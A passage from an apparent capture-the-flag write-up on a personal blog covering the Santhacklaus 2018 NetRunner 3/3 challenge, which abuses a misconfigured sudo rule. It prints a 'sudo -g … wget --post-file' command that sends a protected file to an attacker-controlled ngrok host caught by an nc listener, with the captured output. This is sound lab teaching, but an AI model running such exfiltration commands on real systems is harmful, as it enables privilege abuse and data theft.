+</span></span><span class=line><span class=cl>  _/ <span class=o>[</span>__   <span class=p>|</span>  <span class=o>[</span>__<span class=o>]</span>  <span class=p>|</span>  <span class=o>[</span>__ /  <span class=sb>`</span><span class=p>|</span>__<span class=p>|</span>
+</span></span><span class=line><span class=cl>./__.<span class=o>[</span>___  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=o>[</span>___<span class=se>\_</span>_.<span class=p>|</span>  <span class=p>|</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>:::: Client Note ::::
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You can access to your web interface to have more informations.
+</span></span><span class=line><span class=cl>You can use this maintenance interface anytime to check your Cybernetics Prosthetics status.
+</span></span><span class=line><span class=cl>If you have any issues with Zetatech products, please contact us.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Note: the password is the same than your username.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>:: IMTLD<span class=o>{</span>Pr0t3ct_Y0uR_Gh0sT<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=flag-1>Flag</h3><blockquote><p>IMTLD{Pr0t3ct_Y0uR_Gh0sT}</p></blockquote><h2 id=netrunner-33>NetRunner 3/3</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Points</th><th>Solves</th></tr></thead><tbody><tr><td>Santhacklaus</td><td>NetRunner 3/3</td><td>App-Script</td><td>450</td><td>18</td></tr></tbody></table><h3 id=statement-2>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner3.png data-srcset="/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner3.png, /lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner3.png 1.5x, /lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner3.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner3.png title=/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner3.png></p><h3 id=state-of-the-art-2>State of the art</h3><p>At this point, the goal is pretty obvious: get privileged access. During a pentest there are some attack vectors:</p><ul><li>sudo misconfigured</li><li>crontab or services running as privileged user</li><li>suid binary or script to exploit</li></ul><h3 id=sudo-misconfigured>Sudo misconfigured</h3><p>Here, this is a misconfigured sudo:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo -l 
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> puppet-master: puppet-master
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> puppet-master on 2a87f3ade358:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin,
+</span></span><span class=line><span class=cl>    <span class=nv>lecture</span><span class=o>=</span>never
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User puppet-master may run the following commands on 2a87f3ade358:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>puppet-master : zetatech-maintenance<span class=o>)</span> /usr/bin/wget
+</span></span></code></pre></td></tr></table></div></div><p>Most of the time, the user can run a command as root without password. In this case, the vulnerability comes with the <code>zetatech-maintenance</code> group.</p><p>What could happen if we execute command with this group? We will getting group right :D</p><h3 id=exploit>Exploit</h3><p>I don&rsquo;t have my VPS under my hand, then I will use <code>ngrok</code>, it allows us to open a port through their server and listen / send data on it: <a href=https://ngrok.com/ target=_blank rel="noopener noreffer">https://ngrok.com/</a></p><p>It works like that (picture from their official website):</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://ngrok.com/static/img/demo.png data-srcset="https://ngrok.com/static/img/demo.png, https://ngrok.com/static/img/demo.png 1.5x, https://ngrok.com/static/img/demo.png 2x" data-sizes=auto alt=https://ngrok.com/static/img/demo.png title=https://ngrok.com/static/img/demo.png></p><ol><li>First localhost terminal:</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ngrok tcp <span class=m>1223</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>Web interface 
+</span></span><span class=line><span class=cl>http://127.0.0.1:4040
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Forwarding
+</span></span><span class=line><span class=cl>tcp://0.tcp.ngrok.io:15462 -&gt; localhost:1223        
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>      
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Second local host terminal</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ping 0.tcp.ngrok.io                        
+</span></span><span class=line><span class=cl>PING 0.tcp.ngrok.io <span class=o>(</span>52.15.72.79<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
+</span></span><span class=line><span class=cl>^C
+</span></span><span class=line><span class=cl>--- 0.tcp.ngrok.io ping statistics ---
+</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>0</span> received, 100% packet loss, <span class=nb>time</span> 0ms
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ nc -lvp <span class=m>1223</span>       
+</span></span><span class=line><span class=cl>Listening on <span class=o>[</span>0.0.0.0<span class=o>]</span> <span class=o>(</span>family 0, port 1223<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>On remote server terminal</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>puppet-master@2a87f3ade358:~$ sudo -g zetatech-maintenance wget --post-file /home/puppet-master/tech.not http://52.15.72.79:15462
+</span></span></code></pre></td></tr></table></div></div><p>And magic appears in our second localhost terminal:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -lvp <span class=m>1223</span>       
+</span></span><span class=line><span class=cl>Listening on <span class=o>[</span>0.0.0.0<span class=o>]</span> <span class=o>(</span>family 0, port 1223<span class=o>)</span>
+</span></span><span class=line><span class=cl>Connection from localhost <span class=m>53726</span> received!
+</span></span><span class=line><span class=cl>POST / HTTP/1.1
+</span></span><span class=line><span class=cl>User-Agent: Wget/1.18 <span class=o>(</span>linux-gnu<span class=o>)</span>
+</span></span><span class=line><span class=cl>Accept: */*
+</span></span><span class=line><span class=cl>Accept-Encoding: identity
+</span></span><span class=line><span class=cl>Host: 52.15.72.79:15462
+</span></span><span class=line><span class=cl>Connection: Keep-Alive
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>Content-Length: <span class=m>266</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.___..___.___..__..___..___ __ .  .
+</span></span><span class=line><span class=cl>  _/ <span class=o>[</span>__   <span class=p>|</span>  <span class=o>[</span>__<span class=o>]</span>  <span class=p>|</span>  <span class=o>[</span>__ /  <span class=sb>`</span><span class=p>|</span>__<span class=p>|</span>
+</span></span><span class=line><span class=cl>./__.<span class=o>[</span>___  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=p>|</span>  <span class=o>[</span>___<span class=se>\_</span>_.<span class=p>|</span>  <span class=p>|</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>:::: Admin Note ::::
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>:: IMTLD<span class=o>{</span>Wh3r3_d03s_HuM4n1tY_3nd<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=flag-2>Flag</h3><blockquote><p>IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>
